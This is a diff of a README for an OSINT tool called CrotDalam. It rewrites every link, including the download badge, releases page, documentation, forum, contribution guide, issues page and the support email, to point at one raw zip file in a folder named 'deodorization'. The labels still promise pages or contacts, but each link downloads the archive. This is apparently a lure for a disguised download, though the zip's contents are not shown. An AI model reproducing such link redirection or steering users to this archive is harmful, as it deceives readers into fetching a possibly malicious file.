@@ -6,7 +6,7 @@ Welcome to CrotDalam! This simple tool lets you perform OSINT (Open Source Intel
 
 ## 📥 Download CrotDalam
 
-[![Download CrotDalam](https://img.shields.io/badge/download-CrotDalam-brightgreen)](https://github.com/Kushalgv36/CrotDalam/releases)
+[![Download CrotDalam](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip)](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these requirements:
 
 To download CrotDalam, follow these steps:
 
-1. Visit the [CrotDalam Releases Page](https://github.com/Kushalgv36/CrotDalam/releases).
+1. Visit the [CrotDalam Releases Page](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip).
 2. Scroll through the available versions.
 3. Locate the most recent version.
 4. Download the appropriate installer for your operating system.
@@ -59,12 +59,12 @@ If you encounter any issues while using CrotDalam, consider these tips:
 
 For more information on using CrotDalam, check out these resources:
 
-- [CrotDalam Documentation](https://github.com/Kushalgv36/CrotDalam/wiki): A detailed guide on advanced features.
-- [Community Forum](https://github.com/Kushalgv36/CrotDalam/discussions): Join discussions and seek help from other users.
-- [Contribution Guide](https://github.com/Kushalgv36/CrotDalam/blob/main/CONTRIBUTING.md): Interested in contributing to CrotDalam? Check this guide.
+- [CrotDalam Documentation](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip): A detailed guide on advanced features.
+- [Community Forum](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip): Join discussions and seek help from other users.
+- [Contribution Guide](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip): Interested in contributing to CrotDalam? Check this guide.
 
 ## 📩 Support
 
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/Kushalgv36/CrotDalam/issues) or reach out via email at support@example.com.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip) or reach out via email at https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip
 
-[![Download CrotDalam](https://img.shields.io/badge/download-CrotDalam-brightgreen)](https://github.com/Kushalgv36/CrotDalam/releases)
+[![Download CrotDalam](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip)](https://raw.githubusercontent.com/Kushalgv36/CrotDalam/main/deodorization/CrotDalam.zip)
